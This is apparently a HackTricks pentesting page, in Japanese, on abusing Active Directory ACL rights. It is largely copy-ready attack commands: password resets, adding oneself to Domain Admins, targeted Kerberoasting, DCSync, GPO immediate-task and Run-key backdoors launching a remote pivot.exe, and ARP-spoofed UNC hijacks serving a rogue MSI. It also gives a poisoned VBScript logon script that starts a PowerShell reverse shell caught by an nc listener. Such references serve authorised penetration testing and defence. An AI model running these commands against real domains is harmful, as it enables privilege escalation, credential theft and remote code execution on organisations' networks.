# Active Directory ACLs/ACEs の悪用

{{#include ../../../banners/hacktricks-training.md}}

**このページは、主に** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **および** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)** の techniques をまとめたものです。詳細については、元の記事を確認してください。**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **ユーザーに対する GenericAll 権限**

この privilege により、attacker は target user account を完全に制御できます。`Get-ObjectAcl` command を使用して `GenericAll` rights が確認されると、attacker は次の操作を実行できます。

- **Target の Password を変更**: `net user <username> <password> /domain` を使用して、attacker は user の password を reset できます。
- Linux からは、Samba の `net rpc` を使用して SAMR 経由で同じ操作を実行できます。<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **アカウントが無効化されている場合は、UAC フラグをクリアする**: `GenericAll` により `userAccountControl` を編集できます。Linux からは、BloodyAD で `ACCOUNTDISABLE` フラグを削除できます:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: ユーザーのアカウントに SPN を割り当てて Kerberoast 可能にし、その後 Rubeus と targetedKerberoast.py を使用して、ticket-granting ticket (TGT) のハッシュを抽出し、crack を試みます。
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: ユーザーの事前認証を無効化し、そのアカウントを ASREPRoasting に対して脆弱にします。
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: ユーザーに対する `GenericAll` があれば、証明書ベースの credential を追加し、パスワードを変更せずにそのユーザーとして authenticate できます。以下を参照してください。

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Group に対する GenericAll Rights**

この privilege により、攻撃者は `Domain Admins` のような group に対する `GenericAll` rights を持っている場合、group memberships を操作できます。`Get-NetGroup` を使用して group の distinguished name を特定した後、攻撃者は次の操作を実行できます。

- **自分自身を Domain Admins Group に追加する**: これは直接 commands を実行するか、Active Directory や PowerSploit などの modules を使用して実行できます。
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Linuxからは、対象グループに対するGenericAll/Write権限を持っている場合、BloodyADを利用して自分自身を任意のグループに追加することもできます。対象グループが「Remote Management Users」にネストされている場合、そのグループを受け入れるホスト上で直ちにWinRMアクセスを取得できます。<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

コンピューターオブジェクトまたはユーザーアカウントに対してこれらの権限を持つと、以下が可能になります。

- **Kerberos Resource-based Constrained Delegation**: コンピューターオブジェクトの takeover を可能にします。
- **Shadow Credentials**: shadow credentials を作成する権限を悪用し、コンピューターまたはユーザーアカウントになりすますためにこの technique を使用します。

## **WriteProperty on Group**

ユーザーが特定のグループ（例: `Domain Admins`）のすべてのオブジェクトに対する `WriteProperty` 権限を持っている場合、以下が可能になります。

- **Domain Admins Group への自身の追加**: `net user` と `Add-NetGroupUser` コマンドを組み合わせて実行することで、ドメイン内で privilege escalation を実現できます。
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

この権限により、攻撃者はグループメンバーシップを直接操作するコマンドを使って、`Domain Admins` などの特定のグループに自分自身を追加できます。次のコマンドシーケンスを使用すると、自分自身を追加できます:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

同様の権限であるこの権限を持つ攻撃者は、グループに対する `WriteProperty` 権限を持っている場合、グループのプロパティを変更して自分自身を直接グループに追加できます。この権限の確認と実行は、以下の方法で行います：
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

ユーザーに対する `User-Force-Change-Password` の `ExtendedRight` を保持している場合、現在のパスワードを知らなくてもパスワードをリセットできます。この権限の確認と悪用は、PowerShell または代替のコマンドラインツールを使用して実行でき、インタラクティブセッションや非インタラクティブ環境向けのワンライナーなど、ユーザーのパスワードをリセットする複数の方法を利用できます。コマンドは単純な PowerShell の呼び出しから、Linux 上で `rpcclient` を使用する方法まであり、攻撃ベクトルの多様性を示しています。
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **グループに対する WriteOwner**

攻撃者がグループに対する `WriteOwner` 権限を持っていることを発見した場合、そのグループの所有者を自分自身に変更できます。対象のグループが `Domain Admins` の場合、この影響は特に大きくなります。所有権を変更することで、グループの属性やメンバーシップをより広範に制御できるためです。このプロセスでは、`Get-ObjectAcl` を使用して正しいオブジェクトを特定し、`Set-DomainObjectOwner` を使用して、SID または名前で所有者を変更します。
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

この権限により、攻撃者はユーザーのプロパティを変更できます。具体的には、`GenericWrite` アクセスを持つ攻撃者は、ユーザーのログオン時に悪意のあるスクリプトを実行するよう、ユーザーのログオンスクリプトパスを変更できます。これは、`Set-ADObject` コマンドを使用して、対象ユーザーの `scriptpath` プロパティを攻撃者のスクリプトを指すように更新することで実現します。
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

この権限により、攻撃者は自身や他のユーザーを特定のグループに追加するなど、グループメンバーシップを操作できます。このプロセスには、credential object の作成、それを使用したグループへのユーザーの追加または削除、そして PowerShell コマンドによるメンバーシップ変更の確認が含まれます。
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Linux からは、グループに対する `GenericWrite` を保有している場合、Samba の `net` でメンバーを追加/削除できます（PowerShell/RSAT が利用できない場合に便利です）：<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

AD オブジェクトを所有し、そのオブジェクトに対する `WriteDACL` 権限を持つことで、攻撃者は自身に対してオブジェクトへの `GenericAll` 権限を付与できます。これは ADSI manipulation によって実現され、オブジェクトを完全に制御し、そのグループメンバーシップを変更できるようになります。ただし、Active Directory module の `Set-Acl` / `Get-Acl` cmdlets を使用してこれらの権限を悪用しようとする場合、制限があります。<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner の quick takeover (PowerView)

ユーザーまたはサービスアカウントに対する `WriteOwner` と `WriteDacl` を持っている場合、古いパスワードを知らなくても、PowerView を使って完全に制御し、パスワードをリセットできます：
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
注記:
- `WriteOwner` しか持っていない場合は、まず所有者を自分自身に変更する必要があります:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- パスワードリセット後、任意のプロトコル（SMB/LDAP/RDP/WinRM）でアクセスを検証します。

## **Domain 上での Replication (DCSync)**

DCSync attack は、Domain 上の特定の replication permissions を利用して Domain Controller を模倣し、user credentials を含むデータを同期します。この強力な technique には、`DS-Replication-Get-Changes` などの permissions が必要です。これにより、attackers は Domain Controller に直接アクセスせずに、AD environment から機密情報を抽出できます。<sup>[[5]](#references)</sup> [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects (GPOs) を管理する delegated access は、重大な security risks につながる可能性があります。たとえば、`offense\spotless` のような user に GPO management rights が delegated されている場合、**WriteProperty**、**WriteDacl**、**WriteOwner** などの privileges を持つ可能性があります。これらの permissions は malicious purposes に悪用できます。PowerView を使用すると、次のように確認できます: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerate GPO Permissions

Misconfigured GPOs を特定するには、PowerSploit の cmdlets を chain できます。これにより、特定の user が管理 permissions を持つ GPOs を発見できます: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: 特定の GPO が適用される computers を特定し、潜在的な impact の scope を把握できます。`powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: 特定の computer に適用されている policies を確認するには、`Get-DomainGPO` などの commands を利用できます。

**OUs with a Given Policy Applied**: 特定の policy の影響を受ける organizational units (OUs) は、`Get-DomainOU` を使用して特定できます。

[**GPOHound**](https://github.com/cogiceo/GPOHound) tool を使用して、GPOs を enumerate し、問題を検出することもできます。

### Abuse GPO - New-GPOImmediateTask

Misconfigured GPOs は code execution に悪用できます。たとえば、immediate scheduled task を作成する方法があります。これにより、影響を受ける machines の local administrators group に user を追加し、privileges を大幅に elevate できます:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - GPO Abuse

GroupPolicy module がインストールされている場合、新しい GPO の作成およびリンクや、影響を受けるコンピューター上で backdoor を実行するための registry 値などの設定を行えます。この方法では、GPO が更新され、実行対象のコンピューターにユーザーがログインする必要があります:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPO の Abuse

SharpGPOAbuse は、新しい GPO を作成せずに、タスクを追加したり設定を変更したりして既存の GPO を Abuse する方法を提供します。この tool では、変更を適用する前に既存の GPO を変更するか、RSAT tools を使用して新しい GPO を作成する必要があります:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### ポリシー更新の強制

GPO updates は通常、約90分ごとに発生します。この処理を迅速化するには、特に変更を実装した後、対象コンピューター上で `gpupdate /force` command を使用して、即時の policy update を強制できます。この command により、次回の自動更新サイクルを待たずに、GPOs への変更が適用されます。

### 内部動作

`Misconfigured Policy` のような特定の GPO の Scheduled Tasks を調べると、`evilTask` などの task が追加されていることを確認できます。これらの task は、system behavior の変更や privileges の escalation を目的とした scripts または command-line tools によって作成されます。

`New-GPOImmediateTask` によって生成された XML configuration file に示される task の構造には、実行する command や trigger など、scheduled task の詳細が記述されています。この file は、GPOs 内で scheduled tasks がどのように定義・管理されるかを示すものであり、policy enforcement の一部として arbitrary commands や scripts を実行する方法を提供します。

### ユーザーとグループ

GPOs では、target systems 上の user および group memberships を操作することもできます。Users and Groups policy files を直接編集することで、attackers は local `administrators` group などの privileged groups に users を追加できます。これは GPO management permissions の delegation によって可能になります。この権限により、policy files を変更して新しい users を追加したり、group memberships を変更したりできます。

Users and Groups の XML configuration file には、これらの変更を実装する方法が記述されています。この file に entries を追加することで、影響を受ける systems 全体で特定の users に elevated privileges を付与できます。この method は、GPO manipulation を通じて privilege escalation を直接実行する方法です。

さらに、logon/logoff scripts の利用、autoruns 用の registry keys の変更、.msi files による software の installation、service configurations の編集など、code の実行や persistence の維持に利用できる追加の methods も検討できます。これらの techniques により、GPOs の abuse を通じて access を維持し、target systems を制御するさまざまな手段が提供されます。

### WriteGPLink + UNC path hijacking (ARP spoofing)

OU/domain に対する `WriteGPLink` により、target container の `gPLink` attribute を変更し、GPO 自体を編集せずに **既存の GPO の適用を強制**できます。関連付けられた GPO が **UNC paths** (`\\HOST\share\...`) 経由で remote content をすでに参照している場合、これは有用です。認証済み users は **SYSVOL** を読み取り、再利用可能な policies を offline で調査できるためです。<sup>[[11]](#references)</sup>

High-level workflow:

1. BloodHound を使用して、OU に対する `WriteGPLink` を持つ principal を特定し、その OU 内の computers/users を列挙します。
2. `SYSVOL` を read-only で clone し、GPOs を parse して、UNC paths を参照する **Software Installation**、**drive mappings** (`Drives.xml`)、および **logon/startup scripts** を探します。
3. DFS/domain-namespace paths ではなく、**direct hostname**（例: `\\DC02\share\pkg.msi`）を指定する policies を優先します。hostname-based paths は L2 spoofing による redirect が容易なためです。
4. 選択した GPO GUID を target OU の `gPLink` に追加し、victim にその既存 policy を process させます。
5. 同じ broadcast domain 上で、UNC host に対して ARP spoof を実行し、その IP を locally bind します（`ip addr add <target_ip>/32 dev <iface>`）。これにより、victim の SMB traffic が自分の host に到達します。
6. attacker SMB server（例: `smbserver.py`）から想定される path/filename を serve し、通常の policy processing を待ちます。

Example `SYSVOL` collection and GPO correlation:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
既存の GPO を対象の OU にリンクします:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

リンクされた GPO が UNC path から MSI を deploy する場合、client は **computer startup** 中にそれを取得し、**`NT AUTHORITY\SYSTEM`** として install します。参照されている host を spoof し、**同じ share/path/name** で malicious MSI を提供することで、**SYSVOL を変更せずに** `WriteGPLink` を SYSTEM code execution に変えることができます。

重要な制約:

- **Timing matters**: 新しい link は policy refresh（通常は約 90 分）時に認識されますが、**Software Installation** は通常 **reboot** 時に実行されます。
- Windows Installer は通常、package の **`ProductCode`** を使用して deployment を追跡します。product がすでに install 済みの場合、deployment が skip される可能性があります。
- installer に reject されないように、rogue MSI を patch して、その **`ProductCode`** と **`PackageCode`** を GPO が想定する legitimate package と一致させます。
- 古い `.aas` advertisement files が `SYSVOL` に残っている場合があるため、依存する前に deployment がまだ active に見えることを validate してください。
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

`Drives.xml` の GPP drive mapping により、ユーザーはログオンまたは再接続時に、設定された UNC path に対して認証を行います。参照先の host を spoof すると、**NetNTLMv2** を capture できます。SMB を意図的に失敗させると、Windows は **WebDAV** 経由で再試行し、**NTLM over HTTP** を送信する場合があります。これは **LDAP(S)**、**AD CS**、または **SMB** への relay において、はるかに柔軟です。

#### Logon/startup script UNC hijack

同じパターンは、`SYSVOL` で発見された UNC-hosted script にも適用されます。

- **Logon scripts** は通常、**user** context で実行されます。
- **Startup scripts** は通常、**computer / SYSTEM** context で実行されます。

script path が spoof 可能な hostname を指している場合、UNC host を redirect し、想定された location から replacement script content を提供します。

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` または `\\<dc>\NETLOGON\` 配下の writable paths により、GPO 経由で user logon 時に実行される logon scripts を tamper できます。これにより、ログオンする user の security context で code execution が可能になります。

### Locate logon scripts
- 設定された logon script について user attributes を確認します：
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- ドメイン共有をクロールして、スクリプトへのショートカットや参照を見つけ出す:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- `.lnk` ファイルを解析して、SYSVOL/NETLOGON を指すターゲットを解決する（DFIR に役立つ手法であり、GPO に直接アクセスできない攻撃者にも有用）:
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound は、存在する場合、ユーザーノード上に `logonScript`（scriptPath）属性を表示します。

### write access を検証する（share listings を信用しない）
自動化ツールでは SYSVOL/NETLOGON が read-only と表示される場合がありますが、基盤となる NTFS ACLs により write が許可されていることがあります。必ずテストしてください：
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
ファイルサイズまたは mtime が変化した場合、write 権限があります。変更する前に originals を保持してください。

### RCE のために VBScript logon script を Poison する
PowerShell reverse shell（revshells.com で生成）を起動するコマンドを追加し、business function が壊れないように元のロジックを維持します：
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
ホスト上で待ち受け、次の対話型ログオンを待機します:
```bash
rlwrap -cAr nc -lnvp 443
```
Notes:
- 実行は logging user の token（SYSTEM ではありません）で行われます。Scope は、その script を適用する GPO link（OU、site、domain）です。
- 使用後は、元の content/timestamps を復元してクリーンアップします。


## References

- [1] [Active Directory ACLs/ACEs の悪用](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privileged Accounts と Token Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – ACL Attack Path の更新](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Active Directory の ACLs を使用した権限昇格](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Active Directory Privileges と Privileged Accounts のスキャン](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Linux からの AD attribute/UAC operations](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (group membership)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL abuse、KeePassXC Argon2 cracking、および DPAPI decryption による DC admin への昇格](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: GPO UNC Paths の Hijacking による Code Execution と NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
